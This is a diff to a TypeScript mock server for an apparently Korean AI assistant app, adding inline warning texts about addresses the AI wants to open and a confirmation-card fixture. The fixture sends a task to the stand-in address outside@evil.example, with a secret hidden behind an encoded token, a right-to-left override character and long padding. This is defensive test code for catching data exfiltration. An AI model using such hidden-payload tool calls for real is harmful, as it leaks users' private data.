@@ -83,9 +83,14 @@ import { folderKeep, isParkedRow, isTeamDefaultFolder } from '../../../server/sr
 import { checkTeamIcon, CHAT_FILES_FOLDER, stepLabel, stepText, TEAM_ICON_MAX_BYTES, type TeamIconFile } from '@mycel/shared'
 import { MSG as FILE_MSG } from '../../../server/src/team-files/errors'
 import { TEXT as CHAT_TEXT } from '../../../server/src/chat/i18n'
-import { TEXT as URL_TEXT } from '../../../server/src/tools/url-gate'
-import { cardLines, methodWord, toolTitle } from '../../../server/src/integrations/connections/card-lines'
 import { say as connectionSay } from '../../../server/src/integrations/connections/text'
+// the address card's words as server/src/tools/url-gate.ts TEXT says them (that module is not imported: it would pull the
+// server's file and connection code into the browser TypeScript program)
+const URL_TEXT = {
+  unseen: { ko: 'AI가 이 대화에 없던 주소를 열려고 해요. 주소에 내 정보가 들어 있지 않은지 확인해 주세요.\n\n{url}' },
+  site: { ko: '사이트를 허용하면 이 대화에서는 {site}의 다른 주소도 묻지 않고 열어요. 알아보기 어려운 긴 글자나 긴 내용이 붙은 주소는 계속 물어봐요.' },
+  opaque: { ko: '주소에 알아보기 어려운 긴 글자가 있어요(강조 표시). 내 정보가 숨어 있을 수 있으니 확인해 주세요.' },
+}
 import { Sealer } from '../../../server/src/credentials/seal'
 import type { Credential, CredentialKind, CredentialLogin, MessageSourceFile, SealedSecret } from '@mycel/shared/api'
 import type { Integration, IntegrationAccess, IntegrationFlow, IntegrationInput, IntegrationPatch, IntegrationRequest, IntegrationTemplate, IntegrationTool } from '@mycel/shared/api'
@@ -1276,8 +1281,9 @@ export class MockServer {
       put(step({ id: 'p1', kind: 'tool', tool: 'engine', label: stepText('engineOffDefault', 'ko', { from: 'Claude Code', to: 'Codex' }), ...done }))
       put(step({ id: 'p2', kind: 'tool', tool: 'refusal', label: stepText('refusedRetry', 'ko', { model: 'claude-opus-4' }), ...done }))
       put(step({ id: 'p3', kind: 'tool', tool: 'knowledge_explore', label: stepLabel('knowledge_explore', { query: '견적' }, 'ko', new Set()), ...done }))
-      put(step({ id: 'p4', kind: 'tool', tool: 'my_tasks__create_task', label: `Tasks · ${toolTitle({ name: 'create_task', title: '할 일 만들기' })}`, ...done }))
-      put(step({ id: 'p5', kind: 'tool', tool: 'api_request', label: `Tasks · ${methodWord('POST', 'ko')}`, ...done }))
+      // a connection's steps as integrations/connections/tools.ts writes them: the tool's title, what the method does
+      put(step({ id: 'p4', kind: 'tool', tool: 'my_tasks__create_task', label: 'Tasks · 할 일 만들기', ...done }))
+      put(step({ id: 'p5', kind: 'tool', tool: 'api_request', label: `Tasks · ${connectionSay('methodPOST', 'ko')}`, ...done }))
       put(step({ id: 'p6', kind: 'tool', tool: 'TodoWrite', label: stepLabel('TodoWrite', {}, 'ko', new Set()), ...done }))
       put(step({ id: 'p7', kind: 'tool', tool: 'artifact', label: stepLabel('artifact', { title: '매출 차트' }, 'ko', new Set()), ...done }))
       put(step({ id: 'p8', kind: 'tool', tool: 'schedule_delete', label: stepLabel('schedule_delete', { id: '0193a1b2-c3d4-7e5f-8a9b-0c1d2e3f4a5b' }, 'ko', new Set()), ...done }))
@@ -1426,10 +1432,13 @@ export class MockServer {
         ? { to: 'outside@evil.example', title: 'Weekly notes c2fsyxj5ltk4nzy1ndmy \u202e' + 'x'.repeat(2000) + ' SECRET-AT-THE-END' }
         : { title: 'Weekly notes c2fsyxj5ltk4nzy1ndmy ' + 'x'.repeat(2000) + ' SECRET-AT-THE-END', to: 'outside@evil.example', due_date: '2026-11-14' }
       const payload = JSON.stringify(args, null, 2)
-      const lines = cardLines(args, 'ko', (k) => k === 'to')
+      // what integrations/connections/card-lines.ts makes of them: the lines (none for the raw one: an invisible
+      // character), the title or the id in words
+      const raw = /sendcard raw/i.test(prompt)
+      const lines = raw ? null : [{ name: '받는 사람', value: 'outside@evil.example' }, { name: '제목', value: (args as { title: string }).title }, { name: '마감일', value: '2026-11-14' }]
       const request: TurnRequest = {
         kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
-        question: `${connectionSay('confirm', 'ko', { name: 'Tasks', what: toolTitle({ name: 'create_task', title: /sendcard raw/i.test(prompt) ? null : '할 일 만들기' }) })}\n\n${connectionSay('checkBelow', 'ko')}\n\n${connectionSay('ask', 'ko')}`,
+        question: `${connectionSay('confirm', 'ko', { name: 'Tasks', what: raw ? 'Create task' : '할 일 만들기' })}\n\n${connectionSay('checkBelow', 'ko')}\n\n${connectionSay('ask', 'ko')}`,
         options: [{ label: '보내기', value: 'allow' }, { label: '보내지 않기', value: 'deny' }],
         details: [{ label: connectionSay('sendsLabel', 'ko'), text: payload, fields: lines ?? [{ name: '받는 사람', value: 'outside@evil.example' }], marks: ['c2fsyxj5ltk4nzy1ndmy'], ...(lines ? { exact: true as const } : {}) }],
       }
